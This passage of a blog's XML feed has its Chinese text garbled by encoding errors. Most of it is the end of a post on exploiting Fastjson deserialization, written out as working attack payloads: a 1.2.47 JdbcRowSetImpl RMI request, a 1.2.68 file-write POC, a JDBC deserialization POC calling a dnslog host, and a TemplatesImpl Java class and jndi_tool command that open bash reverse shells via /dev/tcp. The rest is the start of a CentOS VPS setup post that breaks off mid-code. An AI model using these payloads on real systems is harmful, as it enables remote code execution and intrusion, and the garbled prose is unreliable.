href="#fastjson-1-2-47" class="headerlink" title="fastjson 1.2.47"></a>fastjson 1.2.47</h2><p>å¦‚æœå¼¹shell éœ€è¦å…ˆæ­å»º rmi æœåŠ¡å™¨</p><p>å°†<code>127.0.0.1</code> æ¢æˆrmiæœåŠ¡å™¨åœ°å€ <code>8653</code> ä¸ºrmi æœåŠ¡å™¨ç«¯å£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: you-ip:port</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (compatible; MSIE <span class="number">9.0</span>; Windows NT <span class="number">6.1</span>; Win64; x64; Trident/<span class="number">5.0</span>)</span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Content-Length: <span class="number">158</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8653/Exp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjson burp æ’ä»¶</p><p><a href="https://github.com/zilong3033/fastjsonScan">https://github.com/zilong3033/fastjsonScan</a></p><h2 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson 1.2.68"></a>fastjson 1.2.68</h2><h3 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h3><p>åœ¨Fastjson&lt;=1.2.68çš„ç‰ˆæœ¬ä¸­ï¼Œé€šè¿‡æ–°çš„Gadgetsç»•è¿‡autoTypeå¼€å…³ï¼Œåœ¨autoTypeå…³é—­çš„æƒ…å†µä¸‹ä»ç„¶å¯ä»¥ç»•è¿‡é»‘ç™½åå•é˜²å¾¡æœºåˆ¶ï¼Œé€šè¿‡ååºåˆ—åŒ–æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç </p><p>Fastjsonçˆ†å‡ºçš„ç»•è¿‡æ–¹æ³•å¯ä»¥é€šæ€ 1.2.68 ä»¥ä¸‹æ‰€æœ‰ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fastjson &lt;= <span class="number">1.2</span><span class="number">.68</span></span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>ä»»æ„æ–‡ä»¶å†™å…¥POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,<span class="string">&quot;out&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,<span class="string">&quot;out&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/charsets.jar&quot;</span>,<span class="string">&quot;append&quot;</span>:<span class="keyword">false</span>&#125;,<span class="string">&quot;infl&quot;</span>:&#123;<span class="string">&quot;input&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;,<span class="string">&quot;bufLen&quot;</span>:<span class="number">1048576</span>&#125;,<span class="string">&quot;protocolVersion&quot;</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.nio.charset.Charset&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;500&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>JDBCååºåˆ—åŒ–POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<span class="string">&quot;hostToConnectTo&quot;</span>:<span class="string">&quot;172.20.64.40&quot;</span>,<span class="string">&quot;portToConnectTo&quot;</span>:<span class="number">3306</span>,<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="string">&quot;databaseToConnectTo&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;info&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;PORT&quot;</span>:<span class="string">&quot;3306&quot;</span>,<span class="string">&quot;statementInterceptors&quot;</span>:<span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="string">&quot;autoDeserialize&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn&quot;</span>,<span class="string">&quot;PORT.1&quot;</span>:<span class="string">&quot;3306&quot;</span>,<span class="string">&quot;HOST.1&quot;</span>:<span class="string">&quot;172.20.64.40&quot;</span>,<span class="string">&quot;NUM_HOSTS&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;HOST&quot;</span>:<span class="string">&quot;172.20.64.40&quot;</span>,<span class="string">&quot;DBNAME&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="0x05-Fastjsonä¸å‡ºç½‘åˆ©ç”¨"><a href="#0x05-Fastjsonä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="0x05 Fastjsonä¸å‡ºç½‘åˆ©ç”¨"></a>0x05 Fastjsonä¸å‡ºç½‘åˆ©ç”¨</h1><p><a href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></p><p>1.<strong>æœåŠ¡å™¨å‡ºç½‘</strong></p><p>ä½¿ç”¨<code>jndi</code>æ³¨å…¥-<code>ldap -</code>rmi</p><p>2.<strong>æœåŠ¡å™¨ä¸èƒ½å‡ºç½‘</strong></p><ul><li>ç›´æ¥æœ¬åœ°ååºåˆ—åŒ–</li><li><code>BasicDataSource</code>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)</li><li><code>TemplatesImpl</code>  ä¸å¸¸ç”¨</li></ul><h2 id="ååºåˆ—åŒ–-bytecodesç›´æ¥ååºåˆ—åŒ–Poc-TemplatesImpl"><a href="#ååºåˆ—åŒ–-bytecodesç›´æ¥ååºåˆ—åŒ–Poc-TemplatesImpl" class="headerlink" title="ååºåˆ—åŒ–-_bytecodesç›´æ¥ååºåˆ—åŒ–Poc  TemplatesImpl"></a><strong>ååºåˆ—åŒ–-_bytecodesç›´æ¥ååºåˆ—åŒ–Poc</strong>  <code>TemplatesImpl</code></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.sun</span><span class="selector-class">.org</span><span class="selector-class">.apache</span><span class="selector-class">.xalan</span><span class="selector-class">.internal</span><span class="selector-class">.xsltc</span><span class="selector-class">.trax</span>.TemplatesImpl</span><br></pre></td></tr></table></figure><p>ç”±äºè§£æjsonéœ€è¦é¢å¤–æ·»åŠ å‚æ•°Featureï¼Œå› æ­¤å®é™…æƒ…å†µå¯èƒ½ä¸ä¼šé‡åˆ°ï¼Œè¿™é‡Œåªæ˜¯åšä¸ªè®°å½•ã€‚é¦–å…ˆéœ€è¦å‡†å¤‡ä¸€ä¸ªPocï¼š</p><p>åˆ›å»º<code>Poc.java</code> ä»£ç å¦‚ä¸‹ <code>exec</code> ä¸ºpayloadï¼Œä½¿ç”¨ä½ç‰ˆæœ¬Java æ‰§è¡Œæœ€å¥½æ˜¯jdk8 ä»¥ä¸‹çš„ï¼Œ<code>javac Poc.java</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Poc extends AbstractTranslet &#123;</span><br><span class="line">public Poc() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().<span class="built_in">exec</span>(new String[]&#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Poc t = new Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new String[] æ˜¯ä»¥æ•°ç»„çš„æ–¹å¼ä¼ é€ï¼Œèƒ½æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œå¦‚æœä¸åŠ ä¼šæŠ¥é”™ã€‚</p><p>åœ¨ä½¿ç”¨ pythonç”Ÿæˆå­—èŠ‚ç </p><p>python <a href="http://fast.py/">fast.py</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">fin = open(r<span class="string">&quot;Poc.class&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">fout = open(r<span class="string">&quot;en1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">s = base64.encodestring(fin.read()).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><p>å°†ç”Ÿæˆçš„å­—èŠ‚ç æ”¾å…¥<code> poc.class_base64</code></p><p>1.2.24 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;poc.class_base64&quot;</span>],<span class="string">&#x27;_name&#x27;</span>:<span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="string">&quot;_outputProperties&quot;</span>:&#123;&#125;,<span class="string">&quot;_name&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>1.2.47 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;a&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>&#125;,<span class="string">&quot;b&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;poc.class_base64&quot;</span>],<span class="string">&#x27;_name&#x27;</span>: <span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>: &#123;&#125;,<span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,<span class="string">&quot;_name&quot;</span>: <span class="string">&quot;b&quot;</span>,        <span class="string">&quot;_version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><a href="#org-apache-tomcat-dbcp-dbcp2-BasicDataSource" class="headerlink" title="org.apache.tomcat.dbcp.dbcp2.BasicDataSource"></a>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</h2><p>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)</p><p>æ’ä»¶åœ°å€</p><p><a href="https://github.com/bigsizeme/fastjson-check">https://github.com/bigsizeme/fastjson-check</a></p><p>ä¸€é”®ç”Ÿæˆé“¾å­</p><p>çœ‹ä¸åˆ°typeç±»å‹ï¼Œè‡ªè¡Œå¾€å³æ‹‰ã€‚</p><p>å…ˆconfig é€‰æ‹©  ç„¶åGenerte Echo payload</p><p><img src="/2022/498480683/image.png" alt="img"></p><p><img src="/2022/498480683/image.png" alt="img"></p><p><a href="https://jishuin.proginn.com/p/763bfbd63f5d">https://jishuin.proginn.com/p/763bfbd63f5d</a></p><p><a href="https://cloud.tencent.com/developer/article/1785575">https://cloud.tencent.com/developer/article/1785575</a></p><p><a href="https://xz.aliyun.com/t/7104">https://xz.aliyun.com/t/7104</a></p><h1 id="0x06-ç»¼åˆåˆ©ç”¨è„šæœ¬"><a href="#0x06-ç»¼åˆåˆ©ç”¨è„šæœ¬" class="headerlink" title="0x06 ç»¼åˆåˆ©ç”¨è„šæœ¬"></a>0x06 ç»¼åˆåˆ©ç”¨è„šæœ¬</h1><p><a href="https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/jndi_tool.jar">https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/jndi_tool.jar</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 1.1.1.1 8888 <span class="string">&quot;bash=bash -i &gt;&amp;/dev/tcp/x.x.x.x/80 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure><p>å®˜ç½‘ <a href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></p><p>å‚è€ƒé“¾æ¥</p><p><a href="https://jishuin.proginn.com/p/763bfbd63f5d">https://jishuin.proginn.com/p/763bfbd63f5d</a>   Fastjsonä¸‰æ¡åˆ©ç”¨é“¾</p><p><a href="https://www.cnblogs.com/pickmea/p/15157189.html">https://www.cnblogs.com/pickmea/p/15157189.html</a></p><p><a href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg">https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg</a></p><p><a href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/">https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/</a></p><p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>]]></content>
    
    
    <summary type="html">Fastjson æ¦‚è¿°,æ¼æ´åˆ©ç”¨,ä¸å‡ºç½‘åˆ©ç”¨åˆé›†</summary>
    
    
    
    <category term="æ¼æ´åˆ©ç”¨" scheme="https://fz1lin.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Fastjson" scheme="https://fz1lin.com/tags/Fastjson/"/>
    
    <category term="Java" scheme="https://fz1lin.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>vps å¸¸ç”¨ç¯å¢ƒå®‰è£…</title>
    <link href="https://fz1lin.com/2022/2917416115/"/>
    <id>https://fz1lin.com/2022/2917416115/</id>
    <published>2022-03-31T11:14:11.000Z</published>
    <updated>2022-08-04T12:46:25.068Z</updated>
    
    <content type="html"><![CDATA[<p>ä¿®è®¢ç‰ˆæœ¬ v 2.0â€”å¢åŠ javaç¯å¢ƒç›¸å…³å†…å®¹ï¼Œä¼˜åŒ–Linux è¯­å¥ã€å¢åŠ python pip å®‰è£…</p><p>ä¿®è®¢ç‰ˆæœ¬ v 3.0 -å¢åŠ  MySQL å®‰è£…ï¼Œä¼˜åŒ–Linuxè¯­å¥å†…å®¹ã€‚</p><h2 id="å¿…çœ‹"><a href="#å¿…çœ‹" class="headerlink" title="å¿…çœ‹"></a>å¿…çœ‹</h2><p>æœ¬å®‰è£…ç³»ç»Ÿé€‚ç”¨äº centos 7 ç³»åˆ—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br><span class="line">centos 7</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰å®‰è£…ç¯å¢ƒåªæ ¹æ®ä¸ªäººéœ€è¦è¿›è¡Œå®‰è£…ï¼Œæ— éœ€å…¨éƒ¨å®‰è£…ï¼Œä¼šæŒç»­æ·»åŠ ï¼Œä¿®è®¢ ~~</p><p>source /etc/profile  ç¼–è¯‘ååªèƒ½åœ¨å½“å‰ç»ˆç«¯ç”Ÿæ•ˆï¼Œé‡æ–°å¼€å¯ä¸€ä¸ªä¸­æ–­åï¼Œè¯¥ç¯å¢ƒå˜é‡å°†å¤±æ•ˆã€‚è§£å†³åŠæ³•ï¼Œé‡å¯ <code>reboot</code>ã€å³å¯æ°¸ä¹…ç”Ÿæ•ˆ</p><h2 id="Linuxé…ç½®ssh"><a href="#Linuxé…ç½®ssh" class="headerlink" title="Linuxé…ç½®ssh"></a>Linuxé…ç½®ssh</h2><p>1.vncé…ç½®sshè¿æ¥</p><ul><li>æŒ‰ç…§è¦æ±‚è¿›è¡Œé…ç½®</li><li>è¿›è¡Œè¿æ¥</li></ul><p>2.sshè¿æ¥</p><ul><li>é…ç½®sshé…ç½®æ–‡ä»¶</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/ssh_config</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹sshé…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment"># Port 22 å»æ‰æ³¨é‡Š</span></span><br><span class="line">Port <span class="number">22</span></span><br><span class="line"><span class="comment">#------------------------åˆ†å‰²çº¿---------------------------</span></span><br><span class="line"><span class="comment">#PermitLocalCommand no #å»æ‰æ³¨é‡Šå¹¶æ”¹ä¸º</span></span><br><span class="line">PermitLocalCommand yes</span><br><span class="line">- é€€å‡ºä¿å­˜å³å¯</span><br></pre></td></tr></table></figure><p>3.è¿æ¥ssh</p><p>è¾“å…¥å¯†ç å’Œç”¨æˆ·å³å¯</p><h2 id="Yum-æº"><a href="#Yum-æº" class="headerlink" title="Yum æº"></a>Yum æº</h2><p>å›½å¤–çš„æœåŠ¡å¯å¿½ç•¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget</span><br><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d</span><br><span class="line">mv CentOS-Base.repo CentOS-Base.repo.bk</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">yum clean all &amp;&amp; yum makecache</span><br></pre></td></tr></table></figure><p>å…¶ä»–æº</p><p>æ¸…åæº <a href="https://mirrors.tuna.tsinghua.edu.cn/help/centos/">https://mirrors.tuna.tsinghua.edu.cn/help/centos/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç½‘æ˜“æº</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.<span class="built_in">help</span>/CentOS7-Base-163.repo</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸­ç§‘å¤§</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo <span class="string">&#x27;https://lug.ustc.edu.cn/wiki/_export/code/mirrors/help/centos?codeblock=3&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Linux-æœ€å°åŒ–å·¥å…·åº“"><a href="#Linux-æœ€å°åŒ–å·¥å…·åº“" class="headerlink" title="Linux æœ€å°åŒ–å·¥å…·åº“"></a>Linux æœ€å°åŒ–å·¥å…·åº“</h2><p>å› ä¸ºæ˜¯æœ€å°åŒ–å®‰è£…ï¼Œæ‰€ä»¥å¥½å¤šå¸¸ç”¨å·¥å…·éœ€è¦è‡ªè¡Œå®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y vim lrzsz gcc gcc-c++ net-tools wget automake cmake gzip bzip2 zip unzip kernel kernel-devel kernel-headers git-all screen </span><br></pre></td></tr></table></figure><h2 id="Java-ç¯å¢ƒ"><a href="#Java-ç¯å¢ƒ" class="headerlink" title="Java ç¯å¢ƒ"></a>Java ç¯å¢ƒ</h2><p>å®‰è£…å¤šä¸ªJavaç‰ˆæœ¬æ˜¯å¯ä»¥åˆ‡æ¢çš„ï¼Œæ²¡æœ‰æµ‹è¯•åœ¨è¿è¡Œç¨‹åºï¼Œåˆ‡æ¢ç‰ˆæœ¬ï¼Œä¼šä¸ä¼šå‡ºç°æ•…éšœï¼Œæœ€å¥½æµ‹è¯•ä¸€ä¸‹ï¼Œç›®å‰æœ¬åœ°æµ‹è¯•æœåŠ¡æœªå‡ºç°æ•…éšœï¼Œæ²¡æœ‰è·‘æœåŠ¡ï¼Œè‡ªæµ‹å§ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œå®‰è£…</p><p><img src="/2022/2917416115/image.png" alt="img"></p><h3 id="Java11"><a href="#Java11" class="headerlink" title="Java11"></a>Java11</h3><p>1.å®‰è£…javaç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.java.net/openjdk/jdk11/ri/openjdk-11+28_linux-x64_bin.tar.gz</span><br><span class="line">mkdir /opt/java</span><br><span class="line">tar zxvf openjdk-11+28_linux-x64_bin.tar.gz -C /opt/java</span><br><span class="line">rm -rf openjdk-11+28_linux-x64_bin.tar.gz</span><br><span class="line"></span><br><span class="line">vim  /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># java 11</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/java/jdk-11</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=/opt/java/jdk-11</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½æº</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="Java8"><a href="#Java8" class="headerlink" title="Java8"></a>Java8</h3><p>yumå®‰è£…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install java-<span class="number">1.8</span><span class="number">.0</span>-openjdk.x86_64 -y</span><br></pre></td></tr></table></figure><p>æºç å®‰è£…-jdk-8u77</p><p>éœ€è¦è‡ªå·±ä¸‹è½½æºç ã€å®˜ç½‘ä¸‹è½½éœ€è¦æ³¨å†Œç™»å½•ä¸‹è½½ï¼Œ1.8ä¹‹åçš„ï¼Œå¯è‡ªè¡Œæ³¨å†Œä¸‹è½½ï¼Œæ‰€éœ€ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/java</span><br><span class="line">tar zxvf jdk-8u77-linux-x64.tar.gz -C /opt/java</span><br><span class="line">rm -rf jdk-8u77-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line">vim  /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># java 8</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/java/jdk1.8.0_77</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=/opt/java/jdk1.8.0_77</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="Java7"><a href="#Java7" class="headerlink" title="Java7"></a>Java7</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 